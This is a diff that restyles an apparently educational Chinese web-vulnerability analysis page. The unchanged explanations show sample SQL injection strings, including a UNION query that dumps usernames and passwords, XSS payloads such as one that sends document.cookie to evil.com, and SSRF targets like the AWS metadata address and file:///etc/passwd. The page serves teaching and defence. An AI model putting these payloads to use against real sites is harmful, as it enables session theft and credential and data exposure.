@@ -17,13 +17,15 @@
   <main id="main-content">
     <!-- ========== 页面标题 ========== -->
     <section class="page-hero">
+      <div class="hero-bg-orb hero-bg-orb--cyan" style="width:350px;height:350px;opacity:0.08;top:-5%;right:-5%"></div>
+      <div class="hero-bg-orb hero-bg-orb--purple" style="width:250px;height:250px;opacity:0.06;bottom:0;left:-5%"></div>
       <div class="container">
         <div class="breadcrumb">
           <a href="index.html">首页</a><span class="sep">/</span>
-          <a href="list.html">漏洞库</a><span class="sep">/</span>
+          <a href="list.html">学习笔记</a><span class="sep">/</span>
           <span>漏洞详情</span>
         </div>
-        <h1>漏洞深度分析</h1>
+        <h1>漏洞<span class="highlight">深度分析</span></h1>
         <p>深入理解漏洞原理、攻击向量与完整防御策略</p>
       </div>
     </section>
@@ -77,12 +79,12 @@
                 </div>
                 <div class="terminal-body">
                   <div><span class="prompt">$</span> <span class="cmd"># 正常查询语句</span></div>
-                  <div>SELECT * FROM users WHERE name = '<span style="color:#fca5a5;">admin</span>'</div>
+                  <div>SELECT * FROM users WHERE name = '<span style="color:var(--color-accent-red);">admin</span>'</div>
                   <div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># 攻击者输入: admin'--</span></div>
-                  <div>SELECT * FROM users WHERE name = '<span style="color:#fca5a5;">admin'--</span>'</div>
+                  <div>SELECT * FROM users WHERE name = '<span style="color:var(--color-accent-red);">admin'--</span>'</div>
                   <div style="margin-top: 0.5rem; color: var(--color-accent-red);"># -- 是 SQL 注释符，后续的密码验证部分被注释掉了</div>
                   <div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># UNION 注入获取数据</span></div>
-                  <div>SELECT * FROM users WHERE id = '<span style="color:#fca5a5;">1' UNION SELECT username,password FROM users--</span>'</div>
+                  <div>SELECT * FROM users WHERE id = '<span style="color:var(--color-accent-red);">1' UNION SELECT username,password FROM users--</span>'</div>
                 </div>
               </div>
 
@@ -141,11 +143,11 @@
                 </div>
                 <div class="terminal-body">
                   <div><span class="prompt">$</span> <span class="cmd"># 反射型 XSS — URL 参数注入</span></div>
-                  <div style="color:#fca5a5;">https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+                  <div style="color:var(--color-accent-red);">https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
                   <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 存储型 XSS — 留言板注入</span></div>
-                  <div style="color:#fca5a5;">&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</div>
+                  <div style="color:var(--color-accent-red);">&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</div>
                   <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># DOM 型 XSS — innerHTML 直接插入</span></div>
-                  <div>document.getElementById('msg').<span style="color:#fca5a5;">innerHTML</span> = location.hash.slice(1);</div>
+                  <div>document.getElementById('msg').<span style="color:var(--color-accent-red);">innerHTML</span> = location.hash.slice(1);</div>
                 </div>
               </div>
 
@@ -208,11 +210,11 @@
                 </div>
                 <div class="terminal-body">
                   <div><span class="prompt">$</span> <span class="cmd"># 读取云服务器元数据 (AWS)</span></div>
-                  <div style="color:#fca5a5;">http://169.254.169.254/latest/meta-data/</div>
+                  <div style="color:var(--color-accent-red);">http://169.254.169.254/latest/meta-data/</div>
                   <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 扫描内网端口</span></div>
-                  <div style="color:#fca5a5;">http://192.168.1.1:6379/ (Redis)</div>
+                  <div style="color:var(--color-accent-red);">http://192.168.1.1:6379/ (Redis)</div>
                   <div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 利用 file 协议读取文件</span></div>
-                  <div style="color:#fca5a5;">file:///etc/passwd</div>
+                  <div style="color:var(--color-accent-red);">file:///etc/passwd</div>
                 </div>
               </div>
 
